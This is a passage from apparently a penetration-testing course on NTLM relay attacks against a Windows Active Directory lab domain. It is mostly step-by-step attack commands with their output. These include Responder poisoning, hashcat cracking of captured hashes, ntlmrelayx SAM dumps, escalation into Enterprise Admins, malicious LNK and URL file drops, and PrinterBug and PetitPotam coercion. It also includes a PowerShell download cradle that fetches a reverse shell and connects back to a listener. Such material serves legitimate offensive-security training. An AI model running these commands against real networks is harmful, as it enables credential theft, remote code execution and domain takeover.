Security Support Provider Interface (SSPI) is the Windows authentication API that lets applications call security providers. The NTLM SSP (%Windir%\System32\msv1_0.dll) implements the NTLM and NTLMv2 protocols for SSPI consumers.

9.1.3 Authentication Workflow

Domain-joined NTLM authentication uses three messages, followed by pass-through verification via the DC:

StepMessageDirectionPurpose
1NEGOTIATE_MESSAGE (Type 1)Client → ServerClient signals intent to authenticate; declares supported NTLM options via NegotiateFlags
2CHALLENGE_MESSAGE (Type 2)Server → ClientServer responds with its supported flags and a 64-bit nonce (ServerChallenge)
3AUTHENTICATE_MESSAGE (Type 3)Client → ServerClient proves possession of the shared secret via LmChallengeResponse and NtChallengeResponse
4Pass-through (NetrLogonSamLogonWithFlags)Server → DCServer delegates identity verification to the DC; DC returns NETLOGON_VALIDATION_SAM_INFO4 on success

9.1.4 NTLM Message Fields

FieldDescription
Signature8-byte NULL-terminated ASCII string: NTLMSSP\0
MessageType0x00000001 = NEGOTIATE, 0x00000002 = CHALLENGE, 0x00000003 = AUTHENTICATE
NegotiateFlags32 1-bit flags present in all three messages; indicates supported/requested capabilities
ServerChallenge64-bit nonce in CHALLENGE_MESSAGE used to compute the response

9.1.5 NTLM Reconnaissance via CHALLENGE_MESSAGE

Tools such as DumpNTLMInfo.py, ntlm-info, NTLM Challenger, and NTLMRecon parse CHALLENGE_MESSAGE responses to extract host metadata without authentication:

python3 examples/DumpNTLMInfo.py [target-ip]
Impacket v0.12.0.dev1+20230803.144057.e2092339 - Copyright 2023 Fortra

[+] SMBv1 Enabled   : False
[+] Prefered Dialect: SMB 3.0
[+] Server Security : SIGNING_ENABLED | SIGNING_REQUIRED
[+] Max Read Size   : 8.0 MB (8388608 bytes)
[+] Current Time    : 2023-08-14 17:39:26.822236+00:00
[+] Name            : [dc]
[+] Domain          : INLANEFREIGHT
[+] DNS Tree Name   : [domain]
[+] DNS Domain Name : [domain]
[+] DNS Host Name   : [dc].[domain]
[+] OS              : Windows NT 10.0 Build 17763
[+] Null Session    : True

9.1.6 Captured Hash Formats

If capturing via Responder, the hash format differs by version:

VersionResponder Format
NTLMv1User::HostName:LmChallengeResponse:NtChallengeResponse:ServerChallenge
NTLMv2User::Domain:ServerChallenge:Response:NTLMv2_CLIENT_CHALLENGE

9.1.7 Message Signing and Sealing

Message signing provides integrity by computing a MAC over each message using a session key derived from the challenge exchange and the user's password hash - an eavesdropper without the hash cannot sign messages. Message sealing adds symmetric-key encryption; a sealed message is also always signed.

Host TypeDefault SMB Signing Setting
SMB1 ClientEnabled
SMB1 ServerDisabled
SMB2 & SMB3 ClientsNot Required
SMB2 & SMB3 ServersNot Required
Domain ControllersRequired

9.1.8 Extended Protection for Authentication (EPA)

Extended Protection for Authentication (EPA), based on RFC 5056 and introduced in Windows Server 2008, binds NTLM authentication to the specific channel via a channel binding token (CBT), preventing relay to a different channel. EPA applies to SMB and HTTP but requires both endpoints to support it.

9.2 The NTLM Relay Attack

NTLM relay (also known as "NTLM reflection") is an Adversary-in-the-Middle (AiTM) technique. The adversary relays NTLM messages between a victim client and a target server, establishing an authenticated session as the victim. All NTLM versions are susceptible because the protocol lacks mutual authentication - the client cannot verify it is talking to the legitimate server.

Note: Microsoft patched the NTLM self-relay attack (CVE/MS08-068) in 2008. On modern systems, a machine cannot relay authentication back to itself.

9.2.1 The Three Phases

PhaseGoalTechniques
Pre-relayInduce the victim to initiate NTLM authentication toward the attackerPoisoning/spoofing (LLMNR, NBT-NS, mDNS, ARP, DNS, DHCP, WPAD, ADIDNS), authentication coercion
RelayForward the captured NTLM exchange to a relay targetntlmrelayx, Inveigh
Post-relayAbuse the authenticated session on the relay targetSAM dump, command exec, LDAP attacks, RBCD, shadow credentials, AD CS (ESC8/ESC11)

9.2.2 Session Security Bypass Vulnerabilities

CVENameTechniquentlmrelayx Option
CVE-2019-1040Drop the MICStrips MIC + Version fields from AUTHENTICATE_MESSAGE; unsets signing flags--remove-mic
CVE-2019-1166Drop the MIC 2Similar bypass to CVE-2019-1040--remove-mic
CVE-2019-1019Your Session Key is my Session KeyAttacker requests the session key from the DC for any NTLM session-remove-target

9.2.3 Relay Cross-Table

Relay Auth FromRelay Auth OverCross-protocol?
HTTP(S)HTTP(S)No
HTTP(S)IMAP | LDAP(S) | MSSQL | RPC | SMBv1/2/3 | SMTPYes
SMBv1/2/3SMBv1/2/3No
SMBv1/2/3HTTP(S) | IMAP | LDAP(S) | MSSQL | RPC | SMTPYes
WCFHTTP(S) | IMAP | LDAP(S) | MSSQL | RPC | SMBv1/2/3 | SMTPYes
Note: HTTP NTLM authentication does not support session signing, so it can be relayed to LDAP/LDAPS without the signing restriction that blocks SMB-to-LDAP relay on patched DCs.

9.3 Pre-relay: Poisoning and Spoofing

Windows falls back to LLMNR, NBT-NS, and mDNS when DNS cannot resolve a name. These multicast/broadcast protocols let an attacker answer any resolution request and redirect the victim's authentication to the attack machine.

9.3.1 Other Poisoning Attack Types

  • ARP Poisoning
  • DNS Poisoning
  • DHCP Spoofing
  • DHCPv6 Spoofing
  • ADIDNS Poisoning
  • WPAD Spoofing
  • WSUS Spoofing

9.3.2 Responder

Responder is the primary LLMNR/NBT-NS/MDNS poisoner on Linux, with built-in rogue servers for SMB, HTTP, MSSQL, FTP, LDAP, and more. Connect to the attack host first:

ssh [email protected]

Run in analyze mode (no poisoning, reconnaissance only):

sudo python3 Responder.py -I ens192 -A
[Analyze mode: NBT-NS] Request by [target-ip] for WS001, ignoring
[Analyze mode: MDNS] Request by fe80::d090:c3b3:28c:1e47 for ws001.local, ignoring
[Analyze mode: LLMNR] Request by fe80::d090:c3b3:28c:1e47 for WS001, ignoring
[Analyze mode: LLMNR] Request by [target-ip] for ws001, ignoring

Run in poisoning mode (active - answers broadcast requests):

sudo python3 Responder.py -I ens192
[*] [NBT-NS] Poisoned answer sent to [target-ip] for name WS001 (service: File Server)
[*] [MDNS] Poisoned answer sent to [target-ip]    for name ws001.local
[*] [LLMNR]  Poisoned answer sent to [target-ip] for name ws001
[SMB] NTLMv2-SSP Username : [DOMAIN]\[user]
[SMB] NTLMv2-SSP Hash     : Administrator::INLANEFREIGHT:b5daffce9f8d12a5:...

From the user notes, additional Responder usage (with DHCP/WPAD/ProxyAuth options):

sudo responder -I eth0 -dwP        # DHCP + WPAD + ProxyAuth (forces NTLM auth)
responder -I eth0 -rdwv | tee responderHash.txt   # verbose + save output

Capture NTLMv2 hashes and crack with hashcat (mode 5600):

hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
Note: Pretender (written in Go) is an alternative that also handles DHCPv6 DNS takeover. Use --dry for analyze mode. Because it poisons DHCP by default, it can be highly disruptive in production environments.

Methodology

  • SSH into the attack host: 
    ssh [email protected]
  • Analyze broadcast traffic without poisoning: 
    sudo python3 Responder.py -I ens192 -A
  • Start active poisoning: 
    sudo python3 Responder.py -I ens192
  • Crack captured NTLMv2 hashes offline: 
    hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt

9.4 Relay Phase: Hunting for Targets

SMB relay targets must have SMB signing disabled (or not required). Three tools can enumerate this setting across a subnet.

9.4.1 RunFinger

python3 RunFinger.py -i [target-ip]/24
[SMB2]:['[target-ip]', Os:'Windows 10/Server 2016/2019 (check build)', Build:'17763',
 Domain:'INLANEFREIGHT', Bootime: 'Unknown', Signing:'True', RDP:'True', SMB1:'False', MSSQL:'False']

9.4.2 CrackMapExec

The --gen-relay-list option generates a file of hosts with signing disabled:

crackmapexec smb [target-ip]/24 --gen-relay-list relayTargets.txt
SMB  [target-ip]   445  [dc]  [*] Windows 10.0 Build 17763 x64 (signing:True) (SMBv1:False)
SMB  [target-ip]  445  WS01  [*] Windows 10.0 Build 17763 x64 (signing:False) (SMBv1:False)

9.4.3 Nmap

nmap -Pn --script=smb2-security-mode.nse -p 445 [target-ip]/24 --open
Host script results:
| smb2-security-mode:
|   2.02:
|_    Message signing enabled and required          # [dc] - not a relay target

Host script results:
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required      # WS01 - valid relay target

Also from the user notes:

nmap --script=smb2-security-mode.nse -p445 192.168.57.0/24

Methodology

  • Enumerate SMB signing with RunFinger: 
    python3 RunFinger.py -i [target-ip]/24
  • Generate relay target list with CrackMapExec: 
    crackmapexec smb [target-ip]/24 --gen-relay-list relayTargets.txt
  • Verify with Nmap: 
    nmap -Pn --script=smb2-security-mode.nse -p 445 [target-ip]/24 --open

9.5 NTLM Relay over SMB (Post-relay Attacks)

ntlmrelayx (Impacket) is the primary relay tool on Linux. Before running it, disable Responder's own SMB server so both tools don't compete for port 445:

sed -i "s/SMB = On/SMB = Off/" Responder.conf
cat Responder.conf | grep -i smb
# SMB = Off
ntlmrelayx.py -h    # view all options

9.5.1 SAM Dump (Default SMB Post-relay)

By default, ntlmrelayx dumps the SAM hive of any target on which the relayed account has admin rights:

# Terminal 1 - Responder poisons broadcast traffic
sudo python3 Responder.py -I ens192

# Terminal 2 - ntlmrelayx relays to targets
sudo ntlmrelayx.py -tf relayTargets.txt -smb2support
[*] Authenticating against smb://[target-ip] as INLANEFREIGHT/PETER SUCCEED
[*] Target system bootKey: 0x563136fa4deefac97a5b7f87dca64ffa
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:bdaffbfe64f1fc646a3353be1c2c3c99:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Done dumping SAM hashes for host: [target-ip]

9.5.2 Command Execution via SMB

Use -c to run a command on the relay target instead of dumping SAM:

sudo ntlmrelayx.py -tf relayTargets.txt -smb2support -c 'ping -n 1 [target-ip]'

For a reverse shell, serve a PowerShell script and use -c to download and execute it:

# Download Nishang's reverse shell
wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1 -q

# Start a Python HTTP server on the attack host
python3 -m http.server

# Start nc listener
nc -nvlp 7331

# Relay with IEX download cradle
sudo ntlmrelayx.py -tf relayTargets.txt -smb2support -c "powershell -c IEX(New-Object NET.WebClient).DownloadString('http://[target-ip]:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress [target-ip] -Port 7331"
Connection received on [target-ip] 57666
Windows PowerShell running as user WS01$ on WS01
PS C:\Windows\system32>whoami
nt authority\system

Methodology

  • Disable Responder's SMB server, then start poisoning: 
    sed -i "s/SMB = On/SMB = Off/" Responder.conf
sudo python3 Responder.py -I ens192
  • Run ntlmrelayx for SAM dump: 
    sudo ntlmrelayx.py -tf relayTargets.txt -smb2support
  • Run ntlmrelayx for command execution: 
    sudo ntlmrelayx.py -tf relayTargets.txt -smb2support -c 'ping -n 1 [target-ip]'
  • Serve reverse shell and relay execution: 
    python3 -m http.server
nc -nvlp 7331
sudo ntlmrelayx.py -tf relayTargets.txt -smb2support -c "powershell -c IEX(New-Object NET.WebClient).DownloadString('http://[target-ip]:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress [target-ip] -Port 7331"

9.6 ntlmrelayx Advanced Use Cases

9.6.1 Multi-relaying

The multi-relay feature lets ntlmrelayx extract user identities from incoming connections and relay each connection to multiple targets. It is enabled by default for named targets and multi-target files, but disabled for single general targets.

Target TypeExampleMulti-relay Default
Single General Target-t [target-ip]Disabled (1:1)
Single Named Target-t smb://INLANEFREIGHT\\[email protected]Enabled (M:M)
Multiple Targets (-tf)-tf relayTargets.txtEnabled (M:M)

Target definition URI format: scheme://authority/path

  • scheme: e.g. smb, ldap, http, mssql, all (wildcard)
  • authority: DOMAIN_NAME\\USERNAME@HOST:PORT (named targets include domain/user)
  • path: optional; required for HTTP endpoint attacks
# Single general target - multi-relay disabled
ntlmrelayx.py -t smb://[target-ip]

# Single named target - multi-relay enabled
ntlmrelayx.py -t smb://INLANEFREIGHT\\[email protected]

# General target in file - multi-relay enabled via -tf
cat relayTarget.txt
# smb://[target-ip]
ntlmrelayx.py -tf relayTarget.txt

# Disable multi-relay on named target
ntlmrelayx.py -t smb://INLANEFREIGHT\\[email protected] --no-multirelay

9.6.2 SOCKS Proxy Sessions

The -socks option makes ntlmrelayx hold authenticated sessions in a SOCKS4/5 proxy (default port 1080), allowing reuse with any tool via proxychains:

# Start relay with SOCKS
sudo ntlmrelayx.py -tf relayTargets.txt -smb2support -socks

# In the ntlmrelayx console - list active sessions
ntlmrelayx> socks
Protocol  Target         Username              AdminStatus  Port
--------  -------------  --------------------  -----------  ----
SMB       [target-ip]  INLANEFREIGHT/RMONTY  FALSE        445
SMB       [target-ip]  INLANEFREIGHT/PETER   TRUE         445
SMB       [target-ip]  INLANEFREIGHT/NPORTS  FALSE        445
SMB       [target-ip]  INLANEFREIGHT/RMONTY  FALSE        445
SMB       [target-ip]  INLANEFREIGHT/PETER   FALSE        445
SMB       [target-ip]  INLANEFREIGHT/NPORTS  FALSE        445

Configure proxychains to use port 1080, then tunnel Impacket tools:

cat /etc/proxychains4.conf | grep socks4
# socks4  127.0.0.1 1080

# Admin session - remote code execution
proxychains4 -q smbexec.py INLANEFREIGHT/[email protected] -no-pass

# Non-admin session - browse shares
proxychains4 -q smbclient.py INLANEFREIGHT/[email protected] -no-pass
# smbexec output
C:\Windows\system32>whoami
nt authority\system

# smbclient output - access Finance share
# shares
ADMIN$
C$
Finance
IPC$
# use Finance
# ls
-rw-rw-rw-  18  Mon Jul 17  flag.txt
-rw-rw-rw-  22  Mon Jul 17  report.txt

9.6.3 Interactive SMB Client Shells

The -i / --interactive option launches an SMB client shell for each session, listening on a local TCP port reachable via nc:

ntlmrelayx.py -tf relayTargets.txt -smb2support -i
[*] Authenticating against smb://[target-ip] as INLANEFREIGHT/RMONTY SUCCEED
[*] Started interactive SMB client shell via TCP on 127.0.0.1:11000
[*] Authenticating against smb://[target-ip] as INLANEFREIGHT/NPORTS SUCCEED
[*] Started interactive SMB client shell via TCP on 127.0.0.1:11002
# Connect to RMONTY's session on WS01
nc -nv 127.0.0.1 11000
# shares
ADMIN$
C$
Finance
IPC$

Methodology

  • Start SOCKS relay and list sessions: 
    sudo ntlmrelayx.py -tf relayTargets.txt -smb2support -socks
ntlmrelayx> socks
  • Use admin session for RCE via proxychains: 
    proxychains4 -q smbexec.py INLANEFREIGHT/[email protected] -no-pass
  • Use non-admin session to browse shares: 
    proxychains4 -q smbclient.py INLANEFREIGHT/[email protected] -no-pass
  • Launch interactive SMB shells: 
    ntlmrelayx.py -tf relayTargets.txt -smb2support -i
nc -nv 127.0.0.1 11000

9.7 NTLM Cross-protocol Relay Attacks

NTLM messages can be extracted from one protocol and embedded into another - this is cross-protocol relaying. Each relay target protocol enables different post-relay attacks.

9.7.1 NTLM Relay over MSSQL

Use the mssql:// scheme to relay authentication over MSSQL. Then interact with the database via mssqlclient.py proxied through the SOCKS server:

# Disable SMB server in Responder first, then start relay
sudo ntlmrelayx.py -t mssql://[target-ip] -smb2support -socks

# Poison broadcast with Responder (SMB server = Off)
python3 Responder.py -I ens192
[*] Authenticating against mssql://[target-ip] as INLANEFREIGHT/NPORTS SUCCEED
[*] SOCKS: Adding INLANEFREIGHT/[email protected](1433) to active SOCKS connection. Enjoy
# View MSSQL session
ntlmrelayx> socks
# MSSQL  [target-ip]  INLANEFREIGHT/NPORTS  N/A  1433

# Tunnel mssqlclient.py via proxychains
proxychains -q mssqlclient.py INLANEFREIGHT/[email protected] -windows-auth -no-pass
# Enumerate databases
SQL ([DOMAIN]\[user]  dbo@master)> enum_db
# name         is_trustworthy_on
# master       0
# tempdb       0
# model        0
# msdb         1
# development01 0

Or run a query directly without SOCKS, using a named target and -q:

sudo ntlmrelayx.py -t mssql://INLANEFREIGHT\\[email protected] -smb2support -q "SELECT name FROM sys.databases;"
Note: For MSSQL post-relay attacks, switch to root (sudo su -) before running ntlmrelayx. The NTLM self-relay is patched - you cannot relay a machine's authentication back to itself.

Methodology

  • Relay over MSSQL with SOCKS: 
    sudo ntlmrelayx.py -t mssql://[target-ip] -smb2support -socks
python3 Responder.py -I ens192
  • Connect to MSSQL session via proxychains: 
    proxychains -q mssqlclient.py INLANEFREIGHT/[email protected] -windows-auth -no-pass
  • Run direct MSSQL query via relay: 
    sudo ntlmrelayx.py -t mssql://INLANEFREIGHT\\[email protected] -smb2support -q "SELECT name FROM sys.databases;"

9.7.2 NTLM Relay over LDAP

Relaying over LDAP enables three attacks: domain enumeration, computer account creation, and privilege escalation via ACL abuse.

Domain Enumeration

Relay HTTP NTLM authentication over LDAP to the DC (SMB-to-LDAP fails on patched DCs due to signing requirements; HTTP has no signing, so relay succeeds):

# Disable both SMB and HTTP servers in Responder
sed -i "s/SMB = On/SMB = Off/; s/HTTP = On/HTTP = Off/" Responder/Responder.conf
cat Responder.conf | grep -ie "SMB =\|HTTP ="
# SMB = Off
# HTTP = Off

sudo python3 Responder/Responder.py -I ens192
sudo ntlmrelayx.py -t ldap://[target-ip] -smb2support --no-da --no-acl --lootdir ldap_dump
[*] HTTPD(80): Authenticating against ldap://[target-ip] as INLANEFREIGHT/PETER SUCCEED
[*] Dumping domain info for first time
[*] Domain info dumped into lootdir!
ls ldap_dump/
# domain_computers_by_os.html  domain_computers.html  domain_groups.grep
# domain_groups.json  domain_policy.html  domain_trusts.grep  domain_users.grep
# domain_users.json  domain_users_by_group.html  domain_users.html

To check if a DC is vulnerable to CVE-2019-1040 (which would allow SMB-to-LDAP relay):

python3 scan.py [domain]/[user]:'[password]'@[target-ip]
# [*] Target [target-ip] is not vulnerable to CVE-2019-1040
Computer Account Creation

If ms-DS-MachineAccountQuota is 1 or more (default 10), any domain user can create computer accounts. ntlmrelayx automatically upgrades to LDAPS via StartTLS when needed:

sudo ntlmrelayx.py -t ldap://[target-ip] -smb2support --no-da --no-acl --add-computer 'plaintext$'
[*] Adding new computer with username: plaintext$ and password: o6@ekK5#rlw2rAe result: OK
Privilege Escalation via ACL Abuse

If the relayed account has elevated permissions (e.g., Full Control over a high-privilege group), ntlmrelayx can escalate a user you control:

sudo ntlmrelayx.py -t ldap://[target-ip] -smb2support --escalate-user 'plaintext$' --no-dump -debug
[+] Permission found: Full Control on CN=Enterprise Admins,...; Reason: GENERIC_ALL via CN=SQL Admins,...
[*] User privileges found: Adding user to a privileged group (Enterprise Admins)
[+] Performing Group attack
[*] Adding user: plaintext to group Enterprise Admins result: OK
[*] Privilege escalation successful, shutting down...

Methodology

  • Disable SMB + HTTP in Responder, start poisoning: 
    sed -i "s/SMB = On/SMB = Off/; s/HTTP = On/HTTP = Off/" Responder/Responder.conf
sudo python3 Responder/Responder.py -I ens192
  • Dump LDAP domain info via HTTP-to-LDAP relay: 
    sudo ntlmrelayx.py -t ldap://[target-ip] -smb2support --no-da --no-acl --lootdir ldap_dump
  • Create computer account via LDAP relay: 
    sudo ntlmrelayx.py -t ldap://[target-ip] -smb2support --no-da --no-acl --add-computer 'plaintext$'
  • Escalate privileges via ACL abuse: 
    sudo ntlmrelayx.py -t ldap://[target-ip] -smb2support --escalate-user 'plaintext$' --no-dump -debug

9.7.3 NTLM Relay over RPC

MS-RPCE (Microsoft's DCE/RPC extension) supports NTLM as an authentication provider. If a relay target exposes an RPC interface accepting RPC_C_AUTHN_LEVEL_CONNECT, NTLM relay may work.

ValueSecurity Provider
0x00RPC_C_AUTHN_NONE (No Authentication)
0x09RPC_C_AUTHN_GSS_NEGOTIATE (SPNEGO)
0x0ARPC_C_AUTHN_WINNT (NTLM)
0x0ERPC_C_AUTHN_GSS_SCHANNEL (TLS)
0x10RPC_C_AUTHN_GSS_KERBEROS (Kerberos)
0x44RPC_C_AUTHN_NETLOGON (Netlogon)
0xFFRPC_C_AUTHN_DEFAULT (same as WINNT)

ntlmrelayx supports relaying over MS-TSCH (Task Scheduler). ESC11 abuses MS-ICPR (AD CS). The ThePorgs fork of ntlmrelayx has merged ICPR support.

9.7.4 NTLM Relay over All Protocols

The all:// wildcard scheme makes ntlmrelayx attack every service on a relay target:

cat relayTargets.txt
# all://[target-ip]
# all://[target-ip]

# Turn off all Responder servers
sed -i '4,18s/= On/= Off/g' Responder.conf
sudo python3 Responder.py -I ens192

# Relay to all protocols with SOCKS
sudo ntlmrelayx.py -tf relayTargets.txt -smb2support -socks
# Stop servers and review sessions
ntlmrelayx> stopservers
ntlmrelayx> socks
Protocol  Target         Username              AdminStatus  Port
--------  -------------  --------------------  -----------  ----
SMB       [target-ip]  INLANEFREIGHT/PETER   TRUE         445
MSSQL     [target-ip]  INLANEFREIGHT/NPORTS  N/A          1433
HTTPS     [target-ip]  INLANEFREIGHT/RMONTY  N/A          1433
...

9.8 Farming Hashes

Farming forces authentication by placing malicious files in writable shared folders that trigger outbound UNC connections when users browse them.

9.8.1 Enumerating Writable Shares

crackmapexec smb [target-ip]/24 -u anonymous -p '' --shares
SMB  [target-ip]  445  [dc]  smb  READ,WRITE

9.8.2 File Generation with ntlm_theft

ntlm_theft generates multiple file types that force UNC authentication when opened or browsed:

python3 ntlm_theft.py -g all -s [target-ip] -f '@myfile'
Created: @myfile/@myfile.scf (BROWSE TO FOLDER)
Created: @myfile/@myfile-(url).url (BROWSE TO FOLDER)
Created: @myfile/@myfile-(icon).url (BROWSE TO FOLDER)
Created: @myfile/@myfile.lnk (BROWSE TO FOLDER)
Created: @myfile/@myfile.rtf (OPEN)
# ... (additional file types)
Created: @myfile/desktop.ini (BROWSE TO FOLDER)
Generation Complete.

Drop the .lnk or .url file into the writable share:

smbclient.py [email protected] -no-pass
# use smb
# put @myfile/@myfile.lnk
# exit

Then relay with all:// scheme:

cat relayTargets.txt
# all://[target-ip]
# all://[target-ip]

ntlmrelayx.py -tf relayTargets.txt -smb2support -socks

9.8.3 Other File Dropping Tools

CrackMapExec Slinky - creates a malicious LNK in writable shares automatically:

# Check Slinky options
crackmapexec smb -M slinky --options

# Drop LNK file on the smb share (SMB server listener)
crackmapexec smb [target-ip] -u anonymous -p '' -M slinky -o SERVER=[target-ip] NAME=important
SLINKY  [target-ip]  445  [dc]  [+] Found writable share: smb
SLINKY  [target-ip]  445  [dc]  [+] Created LNK file on the smb share

Methodology

  • Find writable shares: 
    crackmapexec smb [target-ip]/24 -u anonymous -p '' --shares
  • Generate malicious files with ntlm_theft: 
    python3 ntlm_theft.py -g all -s [target-ip] -f '@myfile'
  • Upload LNK/URL file to writable share: 
    smbclient.py [email protected] -no-pass
# use smb
# put @myfile/@myfile.lnk
  • Relay with all:// scheme via SOCKS: 
    ntlmrelayx.py -tf relayTargets.txt -smb2support -socks
  • Alternative - drop LNK with Slinky: 
    crackmapexec smb [target-ip] -u anonymous -p '' -M slinky -o SERVER=[target-ip] NAME=important

9.8.4 WebDAV Attacks

WebDAV (WebClient service) is enabled by default on Windows workstations (not servers). If a host has WebDAV running, it will authenticate via HTTP NTLM rather than SMB - bypassing the signing restriction for LDAP relay.

Enumerate whether WebClient service is running:

crackmapexec smb [target-ip]/24 -u plaintext$ -p [password] -M webdav

If WebClient is stopped, trigger it using a .searchConnector-ms file dropped in a share:

# Manual searchConnector-ms content
cat > @secret.searchConnector-ms <<'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<searchConnectorDescription xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">
   <description>Microsoft Outlook</description>
   <isSearchOnlyItem>false</isSearchOnlyItem>
   <includeInStartMenuScope>true</includeInStartMenuScope>
   <templateInfo>
       <folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType>
   </templateInfo>
   <simpleLocation>
       <url>https://whatever/</url>
   </simpleLocation>
</searchConnectorDescription>
EOF

Or use CrackMapExec's drop-sc module:

crackmapexec smb [target-ip] -u anonymous -p '' -M drop-sc -o URL=https://[target-ip]/testing SHARE=smb FILENAME=@secret
DROP-SC  [target-ip]  445  [dc]  [+] [OPSEC] Created @secret.searchConnector-ms file on the smb share

Re-check WebDAV status after waiting for a user to browse the share:

crackmapexec smb [target-ip]/24 -u plaintext$ -p [password] -M webdav
# WEBDAV  [target-ip]  445  WS01  WebClient Service enabled on: [target-ip]

Once WebDAV is active, force HTTP NTLM authentication by placing a Slinky LNK with a WebDAV connection string (\\ANYSTRING@PORT\path) as the server:

crackmapexec smb [target-ip] -u anonymous -p '' -M slinky -o SERVER=NOAREALNAME@8008 NAME=important
sudo python3 Responder.py -I ens192    # poisons NOAREALNAME resolution

# Relay HTTP auth to LDAP (port 8008 matches the WebDAV connection string)
ntlmrelayx.py -t ldap://[target-ip] -smb2support --no-smb-server --http-port 8008 --no-da --no-acl --no-validate-privs --lootdir ldap_dump

9.8.5 Abusing MSSQL Access for Coercion

Use xp_dirtree from a relayed MSSQL session to force the MSSQL service account (e.g., SQL01$) to authenticate against the attack host, then relay that authentication:

# From mssqlclient.py session
xp_dirtree \\[target-ip]\share
Note: For relay attacks, use ntlmrelayx as the listener instead of smbserver.py - the goal is relaying, not just capturing the hash.

9.9 Authentication Coercion

Authentication coercion forces a specific target machine to authenticate against the attacker, rather than waiting for opportunistic broadcast traffic. These attacks abuse insecure RPC methods that cause Windows to initiate UNC authentication. The general sequence is:

  1. Authenticate to the victim over SMB with valid domain credentials.
  2. Connect to a remote named pipe: \PIPE\netdfs, \PIPE\efsrpc, \PIPE\lsarpc, \PIPE\lsass.
  3. Bind to an RPC protocol and call its methods with an attacker-controlled listener address.

9.9.1 MS-RPRN: PrinterBug

PrinterBug abuses RpcRemoteFindFirstPrinterChangeNotificationEx (MS-RPRN) to force SMB NTLM authentication from any machine running the Print Spooler service:

# Coerce DC ([target-ip]) to authenticate to attack host ([target-ip])
python3 printerbug.py [domain]/[user]:'[password]'@[target-ip] [target-ip]
[*] Attempting to trigger authentication via rprn RPC at [target-ip]
[*] Bind OK
[*] Got handle
DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Triggered RPC backconnect, this may or may not have worked

# Responder captures [dc]$ hash:
[SMB] NTLMv2-SSP Username : [DOMAIN]\[user]$
[SMB] NTLMv2-SSP Hash     : [dc]$::INLANEFREIGHT:24044d80125dd669:...

To coerce HTTP NTLM authentication on a WebDAV-enabled host, use a WebDAV connection string as the listener (ATTACKER_NAME@PORT/PATH):

python3 printerbug.py [domain]/[user]:'[password]'@[target-ip] SUPPORTPC@80/print
[WebDAV] NTLMv2 Username : [DOMAIN]\[user]$
[WebDAV] NTLMv2 Hash     : SQL01$::INLANEFREIGHT:26f495d9cf2db5ee:...

9.9.2 MS-EFSR: PetitPotam

PetitPotam abuses EfsRpcOpenFileRaw and EfsRpcEncryptFileSrv (MS-EFSR). CVE-2021-36942 patched the two primary methods; ly4k's fork implements additional unpatched methods. Requires valid domain credentials on patched systems:

# Coerce DC via SMB - attack host as listener
python3 PetitPotam.py [target-ip] [target-ip] -u 'plaintext$' -p '[password]' -d [domain]
[+] OK! Using unpatched function!
[-] Sending EfsRpcEncryptFileSrv!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!

To coerce HTTP on WebDAV-enabled hosts:

python3 PetitPotam.py WIN-MMRQDG2R0ZX@80/files [target-ip] -u 'plaintext$' -p '[password]'
[WebDAV] NTLMv2 Username : [DOMAIN]\[user]$
[WebDAV] NTLMv2 Hash     : SQL01$::INLANEFREIGHT:...

9.9.3 MS-DFSNM: DFSCoerce

DFSCoerce abuses NetrDfsAddStdRoot and NetrDfsRemoveStdRoot (MS-DFSNM). Cannot coerce HTTP NTLM authentication:

python3 dfscoerce.py -u 'plaintext$' -p '[password]' [target-ip] [target-ip]
[-] Sending NetrDfsRemoveStdRoot!
DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[SMB] NTLMv2-SSP Username : [DOMAIN]\[user]$
[SMB] NTLMv2-SSP Hash     : [dc]$::INLANEFREIGHT:e2d2339638fc5fd6:...

9.9.4 Coercer (Multi-method)

Coercer automates 17 methods across 5 RPC protocols. Use scan mode to test which RPC calls are accessible, and coerce mode to trigger them:

# Scan mode - test available coercion methods
Coercer scan -t [target-ip] -u 'plaintext$' -p '[password]' -d [domain] -v
# Coerce mode - trigger authentication coercion
Coercer coerce -t [target-ip] -l [target-ip] -u 'plaintext$' -p '[password]' -d [domain] -v --always-continue

For HTTP NTLM authentication coercion (WebDAV-enabled hosts), use Coercer v1.6 with -wh and -wp:

python3 Coercer.py -t [target-ip] -u 'plaintext$' -p '[password]' -wh SUPPORTPC2 -wp 80 -v
[WebDAV] NTLMv2 Username : [DOMAIN]\[user]$
[WebDAV] NTLMv2 Hash     : SQL01$::INLANEFREIGHT:b3785e9c8db01fc7:...

9.9.5 Manual RPC Coercion

Use the windows-coerced-authentication-methods repository for manual coercion of individual RPC calls:

python3 coerce_poc.py -u 'plaintext$' -p '[password]' -d [domain] [target-ip] [target-ip]
Windows auth coerce using MS-DFSNM::NetrDfsAddStdRoot()
[>] Connecting to ncacn_np:[target-ip][\PIPE\netdfs] ... success
[>] Calling NetrDfsAddStdRoot() ...
DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[SMB] NTLMv2-SSP Username : [DOMAIN]\[user]$

Methodology

  • Coerce DC SMB auth with PrinterBug: 
    python3 printerbug.py [domain]/[user]:'[password]'@[target-ip] [target-ip]
  • Coerce HTTP auth with PrinterBug (WebDAV listener): 
    python3 printerbug.py [domain]/[user]:'[password]'@[target-ip] SUPPORTPC@80/print
  • Coerce with PetitPotam (SMB): 
    python3 PetitPotam.py [target-ip] [target-ip] -u 'plaintext$' -p '[password]' -d [domain]
  • Coerce with PetitPotam (HTTP/WebDAV): 
    python3 PetitPotam.py WIN-MMRQDG2R0ZX@80/files [target-ip] -u 'plaintext$' -p '[password]'
  • Coerce with DFSCoerce: 
    python3 dfscoerce.py -u 'plaintext$' -p '[password]' [target-ip] [target-ip]
  • Scan target for available coercion methods: 
